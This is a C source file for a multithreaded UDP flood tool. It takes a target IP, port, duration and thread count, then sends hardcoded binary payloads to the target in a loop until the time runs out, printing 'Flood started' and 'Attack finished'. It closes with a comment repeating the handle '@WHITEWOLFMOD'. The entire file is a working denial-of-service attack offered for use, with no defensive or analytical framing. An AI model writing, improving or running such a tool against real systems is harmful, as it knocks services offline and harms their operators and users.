#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./program ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\x04\x98\x16\x07\x1C\x7F\xC1\x81\x29\x34\xEB",
  "\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\x04\x98\x16\x07\x1C\x7F\xC1\x81\x29\x34\xEB",
  "\x39\xE0\x25\x98\x73\x69\x5B\x91\x29\xDB\xE2\x61\x7E\x34\xB1\xE8\xD6\x33\x84\x50\xA3\x7F\x88\xC1\x3C\xD4\xF8\xAA\x8F",
  "\x39\xE0\x25\x98\xAF\x75\x5B\x91\x29\xDB\xE2\x61\x7E\x34\x95\xE8\xD6\x33\x84\xF0\xA3\x7F\x3C\xCE\x80\xE9\xF0\xA8\x8F",
  "\x39\xE0\x25\x98\x7F\x75\x5B\x91\x29\xDB\xE2\x61\x7E\x34\x99\xE8\x56\x32\x84\x90\xA3\x7F\x04\xCD\x3C\xE8\xD4\x28\x88\x97\x86\x49\x3D\x11\x8A\x58\x22\xEB\x14\x0E\x54\x44\x4B\x5E\x04\x89\x40\x70\x07\x0E\x9C\x37\x90\x5A\xFE\xAC\xFB\x86\xD8\xDC\xC9\x47\x3D\x16\xE7\xEB\xDB\x98\xF6\x47\xEC\x7C\x2E\xEE\xF3\xFB\x3F\xD2\x7E\x7D\x2B\x61\x98\x89\xFB\x45\x33\x34\xC5\x11\x79\xA9\x94\xC4\x8A\x48\x7F\xB3\x16\x9A",
  "\x8B\x8F\x6A\x0B\xD3\x96\x13\x37\x3D\xC8\x95\x0E\xE6\x08\xEC\xE0\x02\x56\x92\xA4",
  "\xE7\x8E\x86\x05\xB9\x91\xA6\xB4\xE6\x79\xE1\x8F\xBD\x48\x0C\xCA\x3A\x6C\x56\xA6\x55\x48\xA7\xA2\xAC\x77\x55\x3B\x8F\xFF\xB3\xEC\xA6\x3D\x68\xB9\xBB\xA1\xB1\x1C\xF1\xCD\xD0\x37\x8C\x29\x2F\x0C\x03\x77\x04\x34\x90\x5A\x00\xAC\xFB\x86\x26\xDC\xC9\x47\x3D\xB6\x8C\xEB\xD7",
  
  "\xFF\x8E\x88\x05\xBC\x11\x9B\xF4\xF9\x99\xEE\x37\x00\x6C\x11\x6C\x09\x86\x36\x6F\xF6\x9B\xF6\x50\x4E\x0E\xF4\x29\x88\x9E\x73\x9D\xE0\x82\xDA\x26\xA4\x73\x15\xFD\xF1\x38\x5F\x59\x84\x9F\x40\x2A\xE5\x51\x9D\x3B\xF4\x93\xFF\x5E\xD2\xB4\xDE\x9F\xE0\x47\xCE\x22\x3D\xEF\x7B\xF7\x8A\x1B\x95\x1C\x20\xEE\xF7\xF7\xB7\xDC\x3E\xF8\x3B\xE4\x80\x8D\x7B\x45\x3F",
  "\xF3\x8E\x62\x05\xCF\x91\x9D\x34\xFA\x39\xEF\x07\x01\xC4\x11\x30\x09\xAC\x36\x7C\x76\x95\x36\x57\xEE\x0D\xF4\x29\x88\x8A\x93\xD0\xE5\x8C\xB1\x8C\xC1\x40\xB1\x02\xB9\x6E\xC3\x3F\x85\x29\x66\x4E\x25\xCE\xDC\xE1\x44\x45\x01\x2F\x98\xB6\x4C\xDE\xF9\x92\x38\x72\xE7\x11\x1D\x5F\x6B\xC0\xD5\x7C\x2E\x0E\xFC\xFB\x3F\x32\x51\x7D\x2B\x61\x98\x33\xFF\x45\x27\x34\xDD\x90\x1C\xB9\x35\xC7\xAE",
  "\x97\x8E\x12\x05\xF7\x91\x81\x34\xF4\x39\xE8\x87\x03\x84\x10\x90\x09\xFC\x36\x54\xB6\x73\x93\x22\x1F\xFA\x1F\xBA\x3C\x69\x63\xD0\x4A\x6F\xF5\xDE\x76\xA4\x99\x25",
  "\x8F\x8E\x5E\x05\xD5\x91\x90\xB4\xFF\xF9\xED\x0F\xBD\x48\x1E\x9B\xB4\x0B\x17\xA4\x3C\x79\xCA\xB2\x7B\xE1\x34\x61\x0D\x9F\x4C\x8A\x65\x18\xFC\x72\x24\x2B\x88\x36\x6B\x19\x5B\x4D\x0B\x6C\x40\x70\x07\xF4\xD0\x6D\xB9\x8E\x60\x75\xC8\x8E\xDE\xDC\xC5\x86\x4F\x8A\x68\xD2\x7B\xC1\x24\x47\x2C\x7E\x6E\xBF\x8F\xBD\xBF\x53\x12\xFD\x14\x5F\xD6\x4E\x9B\x6D\x36\x54\xB3\xBB\xBB\xA9\x60\x49\x2D\xDC\xFD\xD9\x97\xE8\xDA\xBC\x75\x4F\x0D\xA6\x07\x7B\xDC\x07\x1C\xCD\xDC\xB5\x16\x0D",
  "\x93\x8E\xDD\x92\x37\xBF\x28\xE1\x01\xCB\x96\x0E\xC4\x7B\x67\xE2\x15\x23\xA1\xD0\xBD\x7F\x93\xDA\x85\x6D\xE6\x63\x0B\x4D\xA8\xE5\xDF\x2B\xB3\x45\x19\x93\x19\x24\xF0\x45\xBB\x5F\x84\x89\x68\x02\x3C\x45\xEF\x1C\xFB\x70\x65\x37\xF0\xBD\xF3\xDF\xC9\x47\x3D\x16\xA7\xEA\x1B\xB2\x59\x95\xCC\x7C\xCE\x23\xB3\x44\x2D\x8E\xA1\x71\x69\xB9\xBA\xC9\x07\x20\xCD\x66\xBA\xA8\xC6\x4D\xCB\x32\x8D\x60\x65\x84\xD4\x9B\xBC\xBC\xB6\x53\x0D\xFC\x47\xD8\x46\x23\x09\xEF\x28\xBB\x16\xBE\x02\xDA\x61\x16\xAD\x48\x60\x79\x0E\x41\xF6\x99\xEE\x63\x51\xA8\x54\xF0\x68\x38\x3D\x07\xBD\x4C\xCD\xCC\x6B\x2F\x7C\x2E\x9A\xE8\xA4\x15\x93\xAD\x16\xCC\x07\xE2\x61\x04\x53\x03\xB1\xBB\xE1\x83\x03\x51\x4B\xFC\x32\x36\x3E\x58\xDD\x1D\x1A\xBB\xF4\x20\x43\x78\x98\xB6\x1E\x63",
  "\xAB\x8E\xF0\x0A\x00\x16\x79\xF7\x08\x18\x16\x77\x7C\x0C\x2F\x5C\x16\x1E\x39\xA3\xB1\x73\x93\xCA\x1D\xFA\x1F\xBA\x7C\x67\xD3\xC8\xAD\xBC\x00\x72\x2A\x6C\x09\x24\xB6\xBD\x34\xA0\x7B\xB0\x28\x31\x07\x48\x9C\x65\x90\x15\xFE\xC6\xFB\xBF\xB0\xDC\xC9\x0F\xD4\x14\xAD\xD5\x88\xFA\xF2\xF7\xF4\x7C\x2E\xEE\x69\x79\xA9\x58\xDA\xDB\xA9\xF9\x02\x0B\x67\x45\x87\xF6\xC8\xC5\x95\x56\x6B\x3B\x75\x9F\x24\x79\x49\x99\x30\xBC\x55\x50\x67\xA6\x61\x7B\x0A\x05\xCA\xCF\xA8\xBE\x4E\x5E\xEA\x92\xCD\xA3\xB0\x72\xEA\x5C\xC9\x30\xC8\x82\xE5\xB3\x54\x44\x50\x1D\x43\x75\x23\xEA\xA2\xE2\xC3\x6B\xBA\x99\x0B\xC8\x9A\x10\xE1\x0B\x93\x57\x5A\x45\x16\x92\xD5\xFB\x44\xEA\x36\x59\xA9\x21\xD1\x6D\x73\x3E\x52\xB9\x3C\xCD\x8E\x39\xD1\xA1\xEC\xD3\x4F\xF8\x58\x2F\x42\x33\xC9\x09\xE1\xCA\xFD\x9A\x38\x63\x36\xA2\x75\x4B\x00\xDC\xD0\x92\x6B\xE7\xCE\x05\x70\x3C\x79\x54\x1A\x0D\x08\xA3\x40\x50\x14\x1C\x4B\x2D\x98\xB9\x49\xD6\x5B\x14\x5C\xAC\x65\xF3\x98\x84\xC1\xF2\x1B\xED\x88\xB8\x1F\x21\xBA\x02\x88\x8C\x60\x5B\x00\x7F\x85\xEB\x0A\xC7\xF0\xDE\xC1\x1E\xF9\x78\xDB\x1A\x99\xD7\x74\xEA\xAC\xC0\x43\x1F\xA6\x09\xEA\xE6\xD9\xD3\xE4\x36\x68\x6D\xC2\x19\x28\x4A\x85\xF9\x8A\x5C\xA6\x2A\x43\x43\x20\xEF\x1B\xC6\xE3\x6F\x46\x8B\xBC\xC9\x7B\x59\x6E\x88\x4F\xF7\xB6\xEA\xD1\x96\x25\x04\xBD\x97\x63\x95\xBA\x15\x9C\x94\xE7\x9C\xC9\x4E\x67\xFC\xB9\x1A\xBA\x10\x9B\x79\xB3\x38\x65\x82\xE5\x75\xB1\x01\x2F\x24\xFF\xD0\x63\x71\xD5\x91\x3A\x34\x71\x58\xAC\x40\xEB\x44\x5A\x85\xBA\x04\x77\x60\xF1\x07\x99\x30\x1B\x8E\x83\xEF\x16\xCA\x9B\x2D\xBF\xCF\x1B\xAC\xD5\x70\x7A\x12\xFA\xF0\x69\xD7\xA4\x55\x26\x11\xE1\x98\x11\xFF\x60\xF7\x48\x92\x28\x99\xC3\x58\x9E\xBA\xF6\x69\x73\x1C\x1E\xBA\x5D\x0B\xE7\xDB\xDE\x34\x96\x78\xEE\x34\x83\x7E\x06\xA3\x34\x86\xAE\x63\xBD\xE6\xC1\xDB\xDF\x1A\x8D\xFA\x7C\x0B\x82\x3A\x17\x75\x39\xF8\xE5\xCE\xCC\x13\xB5\x3E",
  "\x67\x8E\x62\x0A\x4F\x96\x5D\x37\x1A\x38\x1F\x07\x79\xC4\x2D\x3A\x26\x4B\x70\x10\xFD\xFF\xBE\xF9\xFC\x38\x63\x2C\xF0\xB5\x83\x5E\xB2\xBA\x50\xA7\x66\x72\x1B\xB5\x4A\x33\xCB\x5F\x14\x0C\x40\x70\x97\x8B\x0E\x34\x90\x5A\xA2\x8C\x3B\x10\xF5\x2C\x6E\x4D\xBE\x4E\xAC\xC3\xD2\xAB\x26\x97\x44\x9E\xBC\x6E\x3B\xC5\x02\xD2\x7E\xB5\x69\x61\x98\x41\xB9\x45\x33\x34\xC5\x3F\x69\xC9\x5F\xD2\x5A\xCE\x10\xBA\x87\xBE\x4E\xB8\x8A\x9B\x65\x22\x51\x32\x9C\x23\x6F\xD0\xA8\xBE\xF2\x2D\xFA\x4E\x05\xB4\x91\x7A\x1A\x85\x2E\xCF\x37\xCE\xFE\x76\x71\x4D\x16\x90\xB9\xEB\xDF\xCD\x73\x50\xA8\xCF\xDB\x94\xCA\xF9\x14\xCC\xE4\x6A\x05\x38\x0A\x93\xAE\x87\xD1\xBD\xB9\x05\x7C\x8B\x5F\x32\xFE\x97\x23\x38\xF3\xA7\xE4\xA7\x26\x08\x66\xA0\x6C\xD2\x4F\xF8\xD8\x9F\x11\xA3\xDD\x9F\xB2\x26\xFD\x48\xD7\x3E\xC5\x0E\x60\x5B\x92\x13\xC2\x03\x7E\x32\x5C\x9A\x04\x00\x8D\x41\x40\xDF\x06\xE7\xE3\x79\x15\xD6\x23\xCF\x1A\x26\x38\x08\x2C\x98\xC4\x9B\xD1\xB9\xE5\x4F\x78\xF8\x9B\x62\x43\xB4\xAF\xBB\xD7\x9A\x69\xF5\xE1\x4E\xC4\xDA\x05\xD9\x6A\x97\x72\xE5\xE6\x68\xE1\x8D\xD8\x10\x99\x0F",
  
  
   

    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
/*
@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD
*/